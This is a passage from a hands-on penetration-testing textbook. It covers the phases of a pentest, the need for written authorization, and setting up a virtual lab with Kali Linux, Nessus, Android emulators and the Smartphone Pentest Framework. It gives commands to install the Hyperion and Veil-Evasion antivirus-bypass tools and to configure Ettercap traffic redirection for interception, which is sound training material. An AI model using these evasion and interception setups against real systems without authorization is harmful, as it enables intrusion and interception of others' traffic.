cannot be patched.\n\nAfter all, with\nclient-side attacks, the software in question must open a malicious file of\nsome sort, so we must convince the user to help us out. In Chapter 12, we\nlook at some methods of bypassing antivirus software, as many of your cli-\nents will deploy it. If you have high enough privileges on a system, you may\nbe able to just turn antivirus programs off, but a better solution is to breeze\nright past antivirus programs undetected, which can be done even if you\nare saving malicious programs to the hard drive. In Chapter 13, we pick up with the next phase of our penetration test,\npost exploitation. Some say the pentest truly begins after exploitation. This\nis where you leverage your access to find additional systems to attack, sensi-\ntive information to steal, and so on. If you continue your penetration test-\ning studies, you will spend a good deal of time working on the latest and\ngreatest post-exploitation techniques. After post exploitation, we look at a few additional skills you will need\nto be a well-rounded penetration tester. We will take a brief look at assess-\ning the security of custom web applications in Chapter 14. Everyone has a\nwebsite these days, so it’s a good skill to cultivate. Next we will look at assess-\ning the security of wireless networks in Chapter 15, looking at methods for\ncracking commonly deployed cryptographic systems. Part IV: Exploit Development\nChapters 16, 17, 18, and 19 discuss the basics of writing your own exploits. We will look at finding vulnerabilities, exploiting them with common tech-\nniques, and even writing our own Metasploit module. Up until these chap-\nters, we have relied on tools and publicly available exploits for a lot of our\nexercises. As you advance in infosec, you may want to find new bugs (called\nzero-days) and report them to vendors for a possible bounty. You can then\nrelease a public exploit and/or Metasploit module to help other pentesters\ntest their customers’ environments for the issue you discovered. Part V: Mobile Hacking\nFinally, in Chapter 20, we close with a relatively new area of penetration test-\ning—assessing the security of mobile devices. We look at my own tool, the\nSmartphone Pentest Framework. Perhaps after mastering the skills in this\nbook, you will endeavor to develop and release a security tool of your own. Of course, this book doesn’t cover every single facet of information\nsecurity, nor every tool or technique. If it did, this book would have been\nseveral times longer and come out a good deal later, and I need to get back\nto my research. So here you have it: a hands-on introduction to hacking. It is\nan honor to be with you on this important step on your journey into informa-\ntion security. I hope that you learn a lot from this book and that it inspires\nyou to continue your studies and become an active member of this exciting\nand rapidly developing field. xxviii Introduction\n0\nPene tr ation testing Primer\nPenetration testing, or pentesting (not to be confused\nwith testing ballpoint or fountain pens), involves sim-\nulating real attacks to assess the risk associated with\npotential security breaches. On a pentest (as opposed\nto a vulnerability assessment), the testers not only dis-\ncover vulnerabilities that could be used by attackers\nbut also exploit vulnerabilities, where possible, to\nassess what attackers might gain after a successful\nexploitation. From time to time, a news story breaks about a major company being\nhit by a cyberattack. More often than not, the attackers didn’t use the latest\nand greatest zero-day (a vulnerability unpatched by the software publishers). Major companies with sizable security budgets fall victim to SQL injec-\ntion vulnerabilities on their websites, social-engineering attacks against\nemployees, weak passwords on Internet-facing services, and so on. In other\nwords, companies are losing proprietary data and exposing their clients’\npersonal details through security holes that could have been fixed. On a\npenetration test, we find these issues before an attacker does, and we rec-\nommend how to fix them and avoid future vulnerabilities. The scope of your pentests will vary from client to client, as will your\ntasks. Some clients will have an excellent security posture, while others will\nhave vulnerabilities that could allow attackers to breach the perimeter and\ngain access to internal systems. You may also be tasked with assessing one or many custom web applica-\ntions. You may perform social-engineering and client-side attacks to gain\naccess to a client’s internal network. Some pentests will require you to act\nlike an insider—a malicious employee or attacker who has already breached\nthe perimeter—as you perform an internal penetration test. Some clients will\nrequest an external penetration test, in which you simulate an attack via the\nInternet. And some clients may want you to assess the security of the wire-\nless networks in their office. In some cases, you may even audit a client’s\nphysical security controls. the stages of the Penetration test\nPentesting begins with the pre-engagement phase, which involves talking to\nthe client about their goals for the pentest, mapping out the scope (the\nextent and parameters of the test), and so on. When the pentester and the\nclient agree about scope, reporting format, and other topics, the actual test-\ning begins. In the information-gathering phase, the pentester searches for publicly\navailable information about the client and identifies potential ways to con-\nnect to its systems. In the threat-modeling phase, the tester uses this informa-\ntion to determine the value of each finding and the impact to the client if\nthe finding permitted an attacker to break into a system. This evaluation\nallows the pentester to develop an action plan and methods of attack. Before the pentester can start attacking systems, he or she performs a\nvulnerability analysis. In this phase, the pentester attempts to discover vul-\nnerabilities in the systems that can be taken advantage of in the exploitation\nphase. A successful exploit might lead to a post-exploitation phase, where the\nresult of the exploitation is leveraged to find additional information, sensi-\ntive data, access to other systems, and so on. Finally, in the reporting phase, the pentester summarizes the findings for\nboth executives and technical practitioners. note For more information on pentesting, a good place to start is the Penetration Testing\nExecution Standard (PTES) at http://www.pentest-standard.org/. Pre-engagement\nBefore the pentest begins, pentesters perform pre-engagement interac-\ntions with the client to make sure everyone is on the same page about the\n2 Chapter 0\npenetration testing. Miscommunication between a pentester and a client\nwho expects a simple vulnerability scan could lead to a sticky situation\nbecause penetration tests are much more intrusive. The pre-engagement stage is when you should take the time to under-\nstand your client’s business goals for the pentest. If this is their first pentest,\nwhat prompted them to find a pentester? What exposures are they most\nworried about? Do they have any fragile devices you need to be careful\nwith when testing? (I’ve encountered everything from windmills to medical\ndevices hooked up to patients on networks.)\nAsk questions about your client’s business. What matters most to them? For example, to a top online vendor, hours of downtime could mean thou-\nsands of dollars of lost revenue. To a local bank, having online banking sites\ngo down for a few hours may annoy a few customers, but that downtime\nwouldn’t be nearly as devastating as the compromise of a credit card data-\nbase. To an information security vendor, having their homepage plastered\nwith rude messages from attackers could lead to a damaged reputation that\nsnowballs into a major revenue loss. Other important items to discuss and agree upon during the pre-\nengagement phase of the pentest include the following:\nScope\nWhat IP addresses or hosts are in scope, and what is not in scope? What\nsorts of actions will the client allow you to perform? Are you allowed to\nuse exploits and potentially bring down a service, or should you limit the\nassessment to merely detecting possible vulnerabilities? Does the client\nunderstand that even a simple port scan could bring down a server or\nrouter? Are you allowed to perform a social-engineering attack? The testing window\nThe client may want you to perform tests only during specific hours or\non certain days. Contact information\nWhom should you contact if you find something serious? Does the cli-\nent expect you to contact someone 24 hours a day? Do they prefer that\nyou use encryption for email? A “get out of jail free” card\nMake sure you have authorization to perform a penetration test on the\ntarget. If a target is not owned by the company (for instance, because\nit’s hosted by a third party), make sure to verify that the client has\nformal approval from the third party to perform the penetration test. Regardless, make sure your contract includes a statement that limits\nyour liability in case something unexpected happens, and get written\npermission to perform the test. Payment terms\nHow and when will you be paid, and how much? Penetration Testing Primer 3\nFinally, include a nondisclosure agreement clause in your contract. Clients will appreciate your written commitment to keep the penetration\ntest and any findings confidential. Information Gathering\nNext is the information-gathering phase. During this phase, you analyze\nfreely available sources of information, a process known as gathering open\nsource intelligence (OSINT). You also begin to use tools such as port scanners\nto get an idea of what systems are out there on the Internet or internal net-\nwork as well as what software is running. We’ll explore information gather-\ning in more detail in Chapter 5. Threat Modeling\nBased on the knowledge gained in the information-gathering phase, we\nmove on to threat modeling. Here we think like attackers and develop plans\nof attack based on the information we’ve gathered. For example, if the client\ndevelops proprietary software, an attacker could devastate the organization\nby gaining access to their internal development systems, where the source\ncode is developed and tested, and selling the company’s trade secrets to a\ncompetitor. Based on the data we found during information gathering, we\ndevelop strategies to penetrate a client’s systems. Vulnerability Analysis\nNext, pentesters begin to actively discover vulnerabilities to determine how\nsuccessful their exploit strategies might be. Failed exploits can crash ser-\nvices, set off intrusion-detection alerts, and otherwise ruin your chances of\nsuccessful exploitation. Often during this phase, pentesters run vulnerabil-\nity scanners, which use vulnerability databases and a series of active checks\nto make a best guess about which vulnerabilities are present on a client’s sys-\ntem. But though vulnerability scanners are powerful tools, they can’t fully\nreplace critical thinking, so we also perform manual analysis and verify\nresults on our own in this phase as well. We’ll explore various vulnerability-\nidentification tools and techniques in Chapter 6. Exploitation\nNow for the fun stuff: exploitation. Here we run exploits against the vul-\nnerabilities we’ve discovered (sometimes using a tool like Metasploit) in an\nattempt to access a client’s systems. As you’ll see, some vulnerabilities will be\nremarkably easy to exploit, such as logging in with default passwords. We’ll\nlook at exploitation in Chapter 8. Post Exploitation\nSome say pentests truly begin only after exploitation, in the post-exploitation\nphase. You got in, but what does that intrusion really mean to the client? If\nyou broke into an unpatched legacy system that isn’t part of a domain or\n4 Chapter 0\notherwise networked to high-value targets, and that system contains no\ninformation of interest to an attacker, that vulnerability’s risk is significantly\nlower than if you were able to exploit a domain controller or a client’s devel-\nopment system. During post exploitation, we gather information about the attacked sys-\ntem, look for interesting files, attempt to elevate our privileges where neces-\nsary, and so on. For example, we might dump password hashes to see if we\ncan reverse them or use them to access additional systems. We might also\ntry to use the exploited machine to attack systems not previously available\nto us by pivoting into them. We’ll examine post exploitation in Chapter 13. Reporting\nThe final phase of penetration testing is reporting. This is where we convey\nour findings to the customer in a meaningful way. We tell them what they’re\ndoing correctly, where they need to improve their security posture, how you\ngot in, what you found, how to fix problems, and so on. Writing a good pentest report is an art that takes practice to master. You’ll need to convey your findings clearly to everyone from the IT staff\ncharged with fixing vulnerabilities to upper management who signs off on\nthe changes to external auditors. For instance, if a nontechnical type reads,\n“And then I used MS08-067 to get a shell,” he or she might think, “You mean,\nlike a seashell?” A better way to communicate this thought would be to men-\ntion the private data you were able to access or change. A statement like “I\nwas able to read your email,” will resonate with almost anyone. The pentest report should include both an executive summary and a\ntechnical report, as discussed in the following sections. Executive Summary\nThe executive summary describes the goals of the test and offers a high-\nlevel overview of the findings. The intended audience is the executives in\ncharge of the security program. Your executive summary should include\nthe following:\nBackground A description of the purpose of the test and definitions\nof any terms that may be unfamiliar to executives, such as vulnerability\nand countermeasure. Overall posture An overview of the effectiveness of the test, the\nissues found (such as exploiting the MS08-067 Microsoft vulnerability),\nand general issues that cause vulnerabilities, such as a lack of patch\nmanagement.\n\nRisk profile An overall rank of the organization’s security posture\ncompared to similar organizations with measures such as high, moder-\nate, or low. You should also include an explanation of the ranking. General findings A general synopsis of the issues identified along\nwith statistics and metrics on the effectiveness of any countermeasures\ndeployed. Penetration Testing Primer 5\nRecommendation summary A high-level overview of the tasks required\nto remediate the issues discovered in the pentest. Strategic road map Give the client short- and long-term goals to\nimprove their security posture. For example, you might tell them to\napply certain patches now to address short-term concerns, but without\na long-term plan for patch management, the client will be in the same\nposition after new patches have been released. Technical Report\nThis section of the report offers technical details of the test. It should\ninclude the following:\nIntroduction An inventory of details such as scope, contacts, and so on. Information gathering Details of the findings in the information-\ngathering phase. Of particular interest is the client’s Internet footprint. Vulnerability assessment Details of the findings of the vulnerability-\nanalysis phase of the test. Exploitation/vulnerability verification Details of the findings from\nthe exploitation phase of the test. Post exploitation Details of the findings of the post-exploitation\nphase of the test. Risk/exposure A quantitative description of the risk discovered. This\nsection estimates the loss if the identified vulnerabilities were exploited\nby an attacker. Conclusion A final overview of the test. summary\nThis chapter has taken a brief look at the phases of penetration testing,\nincluding pre-engagement, information gathering, threat modeling,\nvulnerability analysis, exploitation, post exploitation, and reporting. Familiarity with these phases will be crucial as you begin your pentesting\ncareer, and you’ll learn more about them as you move through the book. 6 Chapter 0\nPaRT I\ntHe BasiCs\n1\nse t ting uP Your Virtual l aB\nAs you work through this book, you’ll get hands-on\nexperience using different tools and techniques for\npenetration testing by working in a virtual lab run-\nning in the VMware virtualization software. I’ll walk\nyou through setting up your lab to run multiple operating systems inside\nyour base operating system in order to simulate an entire network using\njust one physical machine. We’ll use our lab to attack target systems\nthroughout this book. installing Vmware\nAs the first step in setting up your virtual lab, download and install a desk-\ntop VMware product. VMware Player is available free for personal use for\nMicrosoft Windows and Linux operating systems (http://www.vmware.com/\nproducts/player/). VMware also offers VMware Workstation (http://www\n.vmware.com/products/workstation/) for Windows and Linux, which includes\nadditional features such as the ability to take snapshots of the virtual\nmachine that you can revert to in case you break something. VMware\nWorkstation is available for free for 30 days, but after that, you will need\nto buy it or switch back to using VMware Player. Mac users can run a trial version of VMware Fusion (http://www.vmware\n.com/products/fusion/) free for 30 days, and it costs only about $50 after that. As a Mac user, I’ll use VMware Fusion throughout the book, but setup\ninstructions are also included for VMware Player. Download the version of VMware that matches your operating system\nand architecture (32- or 64-bit). If you encounter any problems installing\nVMware, you’ll find plenty of support at the VMware website. setting up kali Linux\nKali Linux is a Debian-based Linux distribution that comes with a wide\nvariety of preinstalled security tools that we’ll use throughout this book. This book is written for Kali 1.0.6, the current version as of this writing. You’ll find a link to a torrent containing a copy of Kali 1.0.6 at this book’s\nwebsite (http://nostarch.com/pentesting/). As time passes, newer versions of\nKali will be released. If you would like, feel free to download the latest ver-\nsion of Kali Linux from http://www.kali.org/. Keep in mind, though, that\nmany of the tools we’ll use in this book are in active development, so if you\nuse a newer version of Kali, some of the exercises may differ from the walk-\nthroughs in this book. If you prefer everything to work as written, I recom-\nmend using the version of Kali 1.0.6 provided in the torrent (a file called\nkali-linux-1.0.6-vm-i486.7z), which is a prebuilt VMware image compressed\nwith 7-Zip. note You can find 7-Zip programs for Windows and Linux platforms at http://www\n.7-zip.org/download.html. For Mac users, I recommend Ez7z from http://ez7z\n.en.softonic.com/mac/. 1. Once the 7-Zip archive is decompressed, in VMware go to File4Open\nand direct it to the file Kali Linux 1.0.6 32 bit.vmx in the decompressed\nKali Linux 1.0.6 32 bit folder. 2. Once the virtual machine opens, click the Play button and, when\nprompted as shown in Figure 1-1, choose I copied it. 3. As Kali Linux boots up, you will be prompted as shown in Figure 1-2. Choose the top (default) highlighted option. 10 Chapter 1\nFigure 1-1: Opening the Kali Linux virtual machine\nFigure 1-2: Booting Kali Linux\nSetting Up Your Virtual Lab 11\n4. Once Kali Linux boots, you will be presented with a login screen like\nthe one shown in Figure 1-3. Figure 1-3: Kali login screen\n5. Click Other and enter the default credentials for Kali Linux, root:toor, as\nshown in Figure 1-4. Then click the Log In button. Figure 1-4: Logging into Kali\n12 Chapter 1\n6. You will be presented with a screen like the one shown in Figure 1-5. Figure 1-5: The Kali Linux GUI\nConfiguring the Network for Your Virtual Machine\nBecause we’ll be using Kali Linux to attack our target systems over a net-\nwork, we need to place all our virtual machines on the same virtual network\n(we will see an example of moving between networks in Chapter 13, which\ncovers post exploitation). VMware offers three options for virtual network\nconnections: bridged, NAT, and host only. You should choose the bridged\noption, but here’s a bit of information about each:\n• The bridged network connects the virtual machine directly to the local\nnetwork using the same connection as the host system. As far as the\nlocal network is concerned, our virtual machine is just another node\non the network with its own IP address. • NAT, short for network address translation, sets up a private network on the\nhost machine. The private network translates outgoing traffic from the\nvirtual machine to the local network. On the local network, traffic from\nthe virtual machine will appear to come from the host machine’s IP\naddress. • The host-only network limits the virtual machine to a local private net-\nwork on the host. The virtual machine will be able to communicate\nwith other virtual machines in the host-only network as well as the host\nmachine itself, but it will not be able to send or receive any traffic with\nthe local network or the Internet. Setting Up Your Virtual Lab 13\nnote Because our target virtual machines will have multiple known security vulnerabili-\nties, use caution when attaching them to your local network because anyone else on\nthat network can also attack these machines. For this reason, I do not recommend work-\ning through this book on a public network where you do not trust the other users. By default, the Kali Linux virtual machine network adapter is set to\nNAT. Here’s how to change that option on both Windows and Mac OS. VMware Player on Microsoft Windows\nTo change the virtual network on VMware Player for Windows, start VMware\nPlayer and then click your Kali Linux virtual machine. Choose Edit virtual\nmachine settings, as shown in Figure 1-6. (If you’re still running Kali Linux\nin VMware Player, choose Player4Manage4Virtual machine settings.)\nFigure 1-6: Changing the VMware network adapter\nOn the next screen, choose Network Adapter in the Hardware tab and\nchoose the Bridged option in the Network connection section, as shown in\nFigure 1-7. 14 Chapter 1\nFigure 1-7: Changing the network adapter settings\nNow click the Configure Adapters button and check the network\nadapter that you’re using with your host operating system. As you can see\nin Figure 1-8, I’ve selected only the Realtek wireless adapter. Once you’ve\nmade your selection, press OK. Figure 1-8: Selecting a network adapter\nSetting Up Your Virtual Lab 15\nVMware Fusion on Mac OS\nTo change the virtual network connection in VMware Fusion, go to Virtual\nMachine4Network Adapter and change from NAT to Bridged, as shown in\nFigure 1-9. Figure 1-9: Changing the network adapter\nConnecting the Virtual Machine to the Network\nKali Linux should automatically pull an IP address from the Bridged network\nonce you make the switch. To verify your IP address, open a Linux terminal\nby clicking the terminal icon(a black rectangle with the symbols >_) at the\ntop left of the Kali screen (or choose Applications4Accessories4Terminal). Then run the command ifconfig to see your network information, as shown\nin Listing 1-1. root@kali:~# ifconfig\neth0 Link encap:Ethernet HWaddr 00:0c:29:df:7e:4d\ninet addr:192.168.20.9 Bcast:192.168.20.255 Mask:255.255.255.0\ninet6 addr: fe80::20c:29ff:fedf:7e4d/64 Scope:Link\n--snip--\nListing 1-1: Networking information\nnote The prompt root@kali:~# is the superuser (root) prompt. We will learn more about\nthis and the other Linux commands we use for setup in Chapter 2. 16 Chapter 1\nThe IPv4 address for this virtual machine is 192.168.20.9, as highlighted\nin bold in Listing 1-1. (The IP address for your machine will likely differ.)\nTesting Your Internet access\nNow let’s make sure that Kali Linux can connect to the Internet. We’ll use\nthe ping network utility to see if we can reach Google. Make sure your com-\nputer is connected to the Internet, open a Linux terminal, and enter the\nfollowing. root@kali:~# ping www.google.com\nIf you see something like the following in response, you’re online. (We’ll learn more about the ping command in Chapter 3.)\nPING www.google.com (50.0.2.221) 56(84) bytes of data. 64 bytes from cache.google.com (50.0.2.221): icmp_req=1 ttl=60 time=28.7 ms\n64 bytes from cache.google.com (50.0.2.221): icmp_req=2 ttl=60 time=28.1 ms\n64 bytes from cache.google.com (50.0.2.221): icmp_req=3 ttl=60 time=27.4 ms\n64 bytes from cache.google.com (50.0.2.221): icmp_req=4 ttl=60 time=29.4 ms\n64 bytes from cache.google.com (50.0.2.221): icmp_req=5 ttl=60 time=28.7 ms\n64 bytes from cache.google.com (50.0.2.221): icmp_req=6 ttl=60 time=28.0 ms\n--snip--\nIf you do not receive a response, make sure that you have set your net-\nwork adapter to Bridged, that Kali Linux has an IP address, and, of course,\nthat your host system currently has Internet access. Installing Nessus\nAlthough Kali Linux has just about every tool we’ll need, we do need to\ninstall a few additional programs. First, we’ll install Tenable Security’s\nNessus Home vulnerability scanner. This scanner is free for home use only\n(you’ll see a description of limitations on the Nessus website). Note that\nNessus is very actively developed, so the current version as well as its GUI\nmay have changed a bit since this book went to press. Use the following steps to install Nessus Home from within Kali:\n1. Open Applications4Internet4Iceweasel Web Browser and enter\nhttp://www.tenable.com/products/nessus-home/ in the address bar. Complete\nthe Register for an Activation Code information and click Register. (Use a real email address—you’ll need the activation code later.)\n2. Once you reach the Downloads page, choose the latest version of Nessus\nfor the Linux Debian 32-bit platform (Nessus-5.2.5-debian6_i386.deb as of\nthis writing) and download it to your root directory (the default down-\nload location). 3. Open a Linux terminal (click the terminal icon at the top of the Kali\nscreen) to open a root prompt. Setting Up Your Virtual Lab 17\n4.\n\nEnter ls to see a list of the files in your root directory. You should see\nthe Nessus file that you just downloaded. 5. Enter dpkg -i followed by the name of the file you downloaded (you can\ntype the first letter of the filename and press tab to use tab completion)\nand press enter to begin the install process. Installation may take a while\nas Nessus processes various plugins. Progress is shown by a line of hash\nsymbols (#). Selecting previously unselected package nessus. (Reading database ... 355024 files and directories currently installed.)\nUnpacking nessus (from Nessus-5.2.5-debian6_amd64.deb) ... Setting up nessus (5.2.5) ... nessusd (Nessus) 5.2.5 [build N25109] for Linux\nCopyright (C) 1998 - 2014 Tenable Network Security, Inc\nProcessing the Nessus plugins... [########### ]\n6. Once you’re returned to the root prompt with no errors, Nessus should\nbe installed, and you should see a message like this. All plugins loaded\nFetching the newest plugins from nessus.org... Fetching the newest updates from nessus.org... Done. The Nessus server will start processing these plugins within a\nminute\nnessusd (Nessus) 5.2.5 [build N25109] for Linux\nCopyright (C) 1998 - 2014 Tenable Network Security, Inc\nProcessing the Nessus plugins... [##################################################]\nAll plugins loaded\n- You can start nessusd by typing /etc/init.d/nessusd start\n- Then go to https://kali:8834/ to configure your scanner\n7. Now enter the following to start Nessus. root@kali:~# /etc/init.d/nessusd start\n8. Open the URL https://kali:8834/ in the Iceweasel web browser. You\nshould see a SSL certificate warning, similar to that in Figure 1-10. note If you access Nessus from outside the Iceweasel browser in Kali, you will need to go to\nhttps://<ipaddressofKali>:8834 instead. 18 Chapter 1\nFigure 1-10: Invalid SSL certificate warning\n9. Expand I Understand the Risks and click Add Exception. Then click\nConfirm Security Exception, as shown in Figure 1-11. Figure 1-11: Confirming the security exception\nSetting Up Your Virtual Lab 19\n10. Click Get Started at the bottom left of the opening Nessus page and\nenter a username and password on the following page. I’ve chosen\ngeorgia:password for my example. If you choose something else, remember\nit because we’ll use Nessus in Chapter 6. (Note that I use poor passwords\nthroughout this book, as will many clients you encounter. In production,\nyou should use much better passwords than password.)\n11. At the next page, enter the activation code you received via email from\nTenable Security. 12. Once registered with Tenable Security, choose the option to download\nplugins (downloading will take some time). Once Nessus processes the\nplugins, it will initialize. When Nessus finishes downloading plugins and configuring the soft-\nware, you should see the Nessus login screen, as shown in Figure 1-12. You\nshould be able to use the credentials for the account you created during\nsetup to log in. Figure 1-12: Login screen of the Nessus web interface\nTo close Nessus, just close its tab in the browser. We will come back to\nNessus in Chapter 6. Installing Additional Software\nWe’re not done yet. Follow these instructions to complete your Kali Linux\ninstall. The Ming C Compiler\nWe need to install a cross compiler so we can compile C code to run on\nMicrosoft Windows systems. The Ming compiler is included in the Kali Linux\nrepositories but is not installed by default. Install it with this command. root@kali:~# apt-get install mingw32\n20 Chapter 1\nHyperion\nWe’ll use the Hyperion encryption program to bypass antivirus software. Hyperion is not currently included in the Kali repositories. Download\nHyperion with wget, unzip it, and compile it with the Ming cross compiler\nyou installed in the previous step, as shown in Listing 1-2. root@kali:~# wget http://nullsecurity.net/tools/binary/Hyperion-1.0.zip\nroot@kali:~# unzip Hyperion-1.0.zip\nArchive: Hyperion-1.0.zip\ncreating: Hyperion-1.0/\ncreating: Hyperion-1.0/FasmAES-1.0/\nroot@kali:~# i586-mingw32msvc-c++ Hyperion-1.0/Src/Crypter/*.cpp -o hyperion.exe\n--snip--\nListing 1-2: Installing Hyperion\nVeil-Evasion\nVeil-Evasion is a tool that generates payload executables you can use to bypass\ncommon antivirus solutions. Install Veil-Evasion Kali (see Listing 1-3) by first\ndownloading it with the command wget. Next, unzip the downloaded file\nmaster.zip and change to the Veil-master/setup directory. Finally, enter ./setup.sh\nand follow the default prompts. root@kali:~# wget https://github.com/ChrisTruncer/Veil/archive/master.zip\n--2015-11-26 09:54:10-- https://github.com/ChrisTruncer/Veil/archive/master.zip\n--snip--\n2015-11-26 09:54:14 (880 KB/s) - `master.zip' saved [665425]\nroot@kali:~# unzip master.zip\nArchive: master.zip\n948984fa75899dc45a1939ffbf4fc0e2ede0c4c4\ncreating: Veil-Evasion-master/\n--snip--\ninflating: Veil-Evasion-master/tools/pyherion.py\nroot@kali:~# cd Veil-Evasion-master/setup\nroot@kali:~/Veil-Evasion-master/setup# ./setup.sh\n=========================================================================\n[Web]: https://www.veil-evasion.com | [Twitter]: @veilevasion\n=========================================================================\n[*] Initializing Apt Dependencies Installation\n--snip—\nDo you want to continue? [Y/n]? Y\n--snip--\nroot@kali:~#\nListing 1-3: Installing Veil-Evasion\nSetting Up Your Virtual Lab 21\nEttercap\nEttercap is a tool for performing man-in-the-middle attacks. Before run-\nning it for the first time, we need to make a couple of changes to its config-\nuration file at /etc/ettercap/etter.conf. Open its configuration file from a Kali\nroot prompt in the nano editor. root@kali:~# nano /etc/ettercap/etter.conf\nFirst change the userid and groupid values to 0 so Ettercap can run with\nroot privileges. Scroll down to where you see the following lines in the file. Replace whatever values you see following the equal signs (=) with a 0. [privs]\nec_uid = 0 # nobody is the default\nec_gid = 0 # nobody is the default\nNow scroll down to the Linux section of the file and uncomment\n(remove the leading # characters) before the two lines shown at u and v\nin Listing 1-4 to set Iptables firewall rules to redirect the traffic. #---------------\n# Linux\n#---------------\n# if you use ipchains:\n#redir_command_on = \"ipchains -A input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT\n%rport\"\n#redir_command_off = \"ipchains -D input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT\n%rport\"\n# if you use iptables:\nuredir_command_on = \"iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j\nREDIRECT --to-port %rport\"\nvredir_command_off = \"iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j\nREDIRECT --to-port %rport\"\nListing 1-4: Ettercap configuration file\nSave and exit the file by pressing ctrl-X and then Y to save the changes. Setting Up Android Emulators\nNow we’ll set up three Android emulators on Kali to use for mobile testing\nin Chapter 20. First we’ll need to download the Android SDK. 1. Open the Iceweasel web browser from within Kali and visit https://\ndeveloper.android.com/sdk/index.html. 2. Download the current version of the ADT bundle for 32-bit Linux and\nsave it to your root directory. 22 Chapter 1\n3. Open a terminal, list the files there (ls), and extract the compressed\narchive that you just downloaded with unzip (the x’s represent the name\nof your file, as versions may have changed since this was written). root@kali:~# unzip adt-bundle-Linux-x86-xxxxxxxxxxx.zip\n4. Now use cd to go into the new directory (with the same name as the file\nwithout the .zip extension). # cd sdk/tools\n# ./android\n5. The Android SDK Manager should open, as shown in Figure 1-13. Figure 1-13: The Android SDK Manager\nWe’ll download any updates to the Android SDK tools and Android SDK\nplatform tools (checked by default), as well as Android 4.3 and a couple of\nolder versions of Android with specific vulnerabilities, Android 2.2 and\nAndroid 2.1. Select the boxes to the left of each Android version. Then\n(leaving Updates/New and Installed checked) click Install packages, as\nshown in Figure 1-14. Accept the license agreement, and the Android SDK\nshould download and install the chosen packages. Installation will likely\ntake several minutes. Setting Up Your Virtual Lab 23\nFigure 1-14: Installing Android software\nNow it’s time to set up our Android virtual devices. Open the Android\nSDK Manager and choose Tools4Manage AVDs. You should see the win-\ndow shown in Figure 1-15. Figure 1-15: Android Virtual Device Manager\n24 Chapter 1\nWe’ll create three Android emulators based on Android 4.3, 2.2,\nand 2.1, as shown in Figure 1-16. Use the values shown in the figure for\neach emulator but set the value of Target to the Android version of the\nemulator you would like to build (the Google API versions of Android 4.3\n[Google APIs version 18], 2.2 [Google APIs version 8], and 2.1 [Google\nAPIs version 7]). Fill the AVD Name field with a descriptive value. Add a\nsmall SD Card value (100MB should be more than sufficient) so you can\ndownload files to your Android emulators. Set Device to Nexus 4 and Skin\nto Skin with dynamic hardware controls. Leave the rest of the options at\ntheir defaults. Figure 1-16: Creating an Android emulator\nOnce you’ve built all three emulators, your AVD Manager should look\nlike Figure 1-17 (device names may be different of course). Setting Up Your Virtual Lab 25\nFigure 1-17: Android emulators created in Android Virtual Device Manager\nTo start an emulator, highlight it and click Start. Then click Launch in\nthe pop-up, as shown in Figure 1-18. Figure 1-18: Launching an Android emulator\nIt may take a few minutes for the emulator to boot up for the first time,\nbut once it does, you should have something that looks and feels much like\na real Android device. The Android 4.3 emulator is shown in Figure 1-19. 26 Chapter 1\nFigure 1-19: Android 4.3 emulator\nnote To run the Android emulators in Kali, you will likely need to increase the perfor-\nmance of your virtual machine by increasing its RAM and CPU cores. I am able to\nrun all three emulators with 3GB RAM and two CPU cores allocated to Kali. You\ncan make these changes in the virtual machine settings in your VMware product. The\namount of power you can give to Kali will, of course, depend on the resources avail-\nable on your host machine. As an alternative, instead of running the Android emula-\ntors on Kali Linux, you can install Android and the emulators on your host system\nor even another system on the local network. The exercises in Chapter 20 will work as\nlong as the emulators can communicate with Kali. Smartphone Pentest Framework\nNext, download and install the Smartphone Pentest Framework (SPF), which\nwe’ll use for mobile attacks. Use git to download the source code. Change\nto the downloaded Smartphone-Pentest-Framework directory as shown here. root@kali:~# git clone -b SPFBook https://github.com/georgiaw/Smartphone-Pentest-Framework.git\nroot@kali:~# cd Smartphone-Pentest-Framework\nNow open the file kaliinstall in the nano text editor. The first few lines\nare shown in Listing 1-5.\n\nNote the lines that refer to /root/adt-bundle-linux\n-x86-20131030/sdk/tools/android. If the name of your ADT bundle folder is\ndifferent (due to the release of a subsequent version), change this value to\nmatch the correct place where you installed the Android ADT in the previ-\nous section. Setting Up Your Virtual Lab 27\nroot@kali:~/Smartphone-Pentest-Framework# nano kaliinstall\n#!/bin/sh\n## Install needed packages\necho -e \"$(tput setaf 1)\\nInstallin serialport, dbdpg, and expect for perl\\n\"; echo \"$(tput\nsgr0)\"\necho -e \"$(tput setaf 1)#########################################\\n\"; echo \"$(tput sgr0)\"\necho $cwd;\n#apt-get -y install libexpect-perl libdbd-pg-perl libdevice-serialport-perl;\napt-get install ant\n/root/adt-bundle-linux-x86-20131030/sdk/tools/android update sdk --no-ui --filter android-4 -a\n/root/adt-bundle-linux-x86-20131030/sdk/tools/android update sdk --no-ui --filter addon-google_\napis-google-4 -a\n/root/adt-bundle-linux-x86-20131030/sdk/tools/android update sdk --no-ui --filter android-14 -a\n/root/adt-bundle-linux-x86-20131030/sdk/tools/android update sdk --no-ui --filter addon-google_\napis-google-14 -a\n--snip--\nListing 1-5: Installing Smartphone Pentest Framework\nNow run the kaliinstall script, as shown here. root@kali:~/Smartphone-Pentest-Framework# ./kaliinstall\nThis will set up the SPF, which we’ll use in Chapter 20. Finally, we need to make one more change to the configuration file for\nSPF. Change directories to Smartphone-Pentest-Framework/frameworkconsole\nand open the file config in nano. Look for the option #LOCATION OF ANDROID\nSDK. If your ADT bundle folder name has changed since the version current\nat the time of this writing, change it accordingly in the line that begins with\nANDROIDSDK=. root@kali:~/Smartphone-Pentest-Framework# cd frameworkconsole/\nroot@kali:~/Smartphone-Pentest-Framework/frameworkconsole# nano config\n--snip--\n#LOCATION OF ANDROID SDK\nANDROIDSDK = /root/adt-bundle-linux-x86-20131030/sdk\n--snip--\ntarget Virtual machines\nWe’ll use three custom-built target machines to simulate vulnerabilities\noften found in client environments: Ubuntu 8.10, Windows XP SP3, and\nWindows 7 SP1. You’ll find a link to a torrent containing the Ubuntu virtual machine\nat http://www.nostarch.com/pentesting/. The target system is compressed using\nthe 7-Zip archive, and 1stPentestBook?! is the password for the archive. You can\nuse 7-Zip programs to open the archives for all platforms. For the Windows\nand Linux packages, use http://www.7-zip.org/download.html; for Mac OS, use\nEz7z at http://ez7z.en.softonic.com/mac/. The archive is ready for use as soon as\nit is unzipped. 28 Chapter 1\nTo set up the Windows virtual machines, you’ll need to install and con-\nfigure Windows XP SP3 and 32-bit Windows 7 SP1. Sources for the 